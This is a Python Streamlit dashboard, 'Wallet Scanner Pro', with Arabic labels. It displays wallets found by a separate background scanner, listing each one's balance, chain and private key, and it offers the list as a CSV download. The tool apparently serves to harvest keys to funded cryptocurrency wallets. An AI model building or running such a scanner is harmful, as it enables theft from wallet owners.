import json
import os
import time
import streamlit as st
import pandas as pd
from datetime import datetime

st.set_page_config(page_title="Wallet Scanner Pro", layout="wide")

STATUS_FILE = "scanner_status.json"

# وظائف قراءة الحالة من السيرفر
def load_status():
    if not os.path.exists(STATUS_FILE):
        return {
            "running": False,
            "total_scanned": 0,
            "wallets": [],
            "last_run": None
        }
    try:
        with open(STATUS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

status = load_status()

# واجهة التحكم
with st.sidebar:
    st.header("⚙️ حالة الخادم")
    st.metric("الحالة", "🟢 تعمل" if status.get("running") else "🔴 متوقفة")
    st.metric("آخر تشغيل", status.get("last_run") or "—")
    st.metric("إجمالي المفحوصة", f"{status.get('total_scanned', 0):,}")
    st.info("لإعادة التشغيل، قم بتشغيل الخادم في الخلفية (scanner_server.py)")

# التبويبات
tab1, tab2, tab3 = st.tabs(["📡 المراقبة", "💰 النتائج", "📈 الإحصائيات"])

with tab1:
    st.header("📊 المراقبة اللحظية")
    st.metric("🧮 إجمالي المحافظ المفحوصة", f"{status.get('total_scanned', 0):,}")
    st.metric("💎 عدد النتائج", len(status.get("wallets", [])))
    st.info("يتم التحديث تلقائياً كل 5 ثوانٍ")

with tab2:
    st.header("📋 المحافظ المكتشفة")
    wallets = status.get("wallets", [])
    if wallets:
        df = pd.DataFrame(wallets)
        df["الرصيد (USDT)"] = df["total_usdt"].apply(lambda x: f"${x:,.2f}")
        df["وقت الاكتشاف"] = pd.to_datetime(df["timestamp"])
        df = df.rename(columns={
            "address": "العنوان",
            "chain": "السلسلة",
            "score": "التصنيف",
            "private_key": "المفتاح الخاص"
        })
        st.dataframe(df[["العنوان", "السلسلة", "الرصيد (USDT)", "التصنيف", "المفتاح الخاص", "وقت الاكتشاف"]])
        st.download_button("⬇️ تحميل النتائج (CSV)", data=df.to_csv(index=False), file_name="wallets.csv")
    else:
        st.warning("لا توجد محافظ مكتشفة بعد.")

with tab3:
    st.header("📈 إحصائيات عامة")
    if wallets:
        df = pd.DataFrame(wallets)
        st.subheader("📊 توزيع السلاسل")
        st.bar_chart(df["chain"].value_counts())
        st.subheader("💰 توزيع الأرصدة")
        st.bar_chart(df["total_usdt"])
    else:
        st.info("ابدأ الفحص لرؤية الإحصائيات.")

# تحديث تلقائي كل 5 ثوانٍ
time.sleep(5)
st.rerun()